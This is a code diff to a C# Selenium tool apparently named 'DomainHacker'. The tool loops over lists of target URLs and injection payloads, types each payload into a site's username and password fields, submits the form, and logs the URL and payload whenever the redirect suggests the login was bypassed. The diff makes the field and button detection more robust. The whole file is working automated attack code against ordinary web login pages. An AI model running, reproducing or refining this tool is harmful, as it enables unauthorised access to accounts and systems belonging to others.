@@ -2,6 +2,7 @@
 using OpenQA.Selenium.Chrome;
 using OpenQA.Selenium.Firefox;
 using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Threading;
@@ -16,9 +17,9 @@ namespace DomainHacker
             Console.WriteLine("Press c for chrome and f for firefox");
             string browser = Console.ReadLine();          
 
-            string[] urls = File.ReadAllLines(@"c:/Users/Public/urls.txt");
-            string[] payloads = File.ReadAllLines(@"c:/Users/Public/payloads.txt");
-            FileStream fileStream = new FileStream(@"c:/Users/Public/allowed.txt", FileMode.Append, FileAccess.Write);
+            string[] urls = File.ReadAllLines(@"urls.txt");
+            string[] payloads = File.ReadAllLines(@"payloads.txt");
+            FileStream fileStream = new FileStream(@"allowed.txt", FileMode.Append, FileAccess.Write);
             StreamWriter writer = new StreamWriter(fileStream);
 
             IWebDriver driver = null;
@@ -43,44 +44,35 @@ namespace DomainHacker
                 {
                     int counter = 0;
                     foreach (string url in urls)
-                    {
-                        driver.SwitchTo().Window(driver.WindowHandles[counter]);
-                        driver.Navigate().GoToUrl(url);
-
-
+                    {                       
                         try
                         {
+                            driver.SwitchTo().Window(driver.WindowHandles[counter]);
+                            driver.Navigate().GoToUrl(url);
                             //USER ID/EMAIL/USERNAME
                             try
                             {
-                                driver.FindElement(By.CssSelector("input[type = text]")).Clear();
-                                driver.FindElement(By.CssSelector("input[type = text]")).SendKeys(payload);
-                                goto PASSWORD;
+                                var element = driver.FindElements(By.CssSelector("input"));
+                                int i = 0;
+                                foreach(var item in element)
+                                {
+                                    string type = item.GetAttribute("type");
+                                    if (type == "text" || type == "username" || type == "email")
+                                    {
+                                        if(element[i+1].GetAttribute("type") == "password")
+                                        {
+                                            item.SendKeys(payload);
+                                            goto PASSWORD;
+                                        }
+                                    }
+                                    i++;
+                                }
                             }
                             catch (Exception)
                             {
-                                goto USERID1;
+                                
                             }
-                        USERID1:
-                            try
-                            {
-                                driver.FindElement(By.CssSelector("input[type = email]")).Clear();
-                                driver.FindElement(By.CssSelector("input[type = email]")).SendKeys(payload);
-                                goto PASSWORD;
-                            }
-                            catch (Exception)
-                            {
-                                goto USERID2;
-                            }
-                        USERID2:
-                            try
-                            {
-                                driver.FindElement(By.CssSelector("input[type = username]")).Clear();
-                                driver.FindElement(By.CssSelector("input[type = username]")).SendKeys(payload);
-                            }
-                            catch (Exception) { }
-
-
+                        
                         //PASSWORD
                         PASSWORD:
                             driver.FindElement(By.CssSelector("input[type = password]")).Clear();
@@ -93,27 +85,44 @@ namespace DomainHacker
                             //SUBMIT/BUTTON
                             try
                             {
-                                driver.FindElement(By.CssSelector("input[type = submit]")).Click();
-                                goto OUT;
-                            }
-                            catch (Exception)
-                            {
-                                goto SUBMIT1;
-                            }
-                        SUBMIT1:
-                            try
-                            {
-                                driver.FindElement(By.CssSelector("input[type = button]")).Click();
-                                goto OUT;
+                                var elements = driver.FindElements(By.CssSelector("input"));
+                                int i = 0;
+                                foreach (var item in elements)
+                                {
+                                    try
+                                    {
+                                        string type = item.GetAttribute("type");
+                                        if (type == "submit" || type == "button")
+                                        {
+                                            if (elements[i - 1].GetAttribute("type") == "password")
+                                            {
+                                                item.Click();
+                                                goto OUT;
+                                            }
+                                            if (elements[i - 1].GetAttribute("type") == "checkbox" && elements[i - 2].GetAttribute("type") == "password")
+                                            {
+                                                item.Click();
+                                                goto OUT;
+                                            }
+                                        }
+                                    }
+                                    catch (Exception)
+                                    {
+                                        continue;
+                                    }
+                                    i++;
+                                }   
                             }
                             catch (Exception)
                             {
                                 goto SUBMIT2;
                             }
+                        
                         SUBMIT2:
                             try
                             {
-                                driver.FindElement(By.CssSelector("button[type = submit]")).Click();
+                                var elements = driver.FindElements(By.CssSelector("button"));
+                                elements[elements.Count - 1].Click();   
                                 goto OUT;
                             }
                             catch (Exception) { }
@@ -130,7 +139,7 @@ namespace DomainHacker
                             try
                             {
                                 string currentUrl = driver.Url;
-                                if (!currentUrl.Contains("login.php"))
+                                if (!currentUrl.Contains("login.php") && !currentUrl.Contains("error"))
                                 {
                                     writer.WriteLine(url + "    " + payload);
                                     writer.Flush();
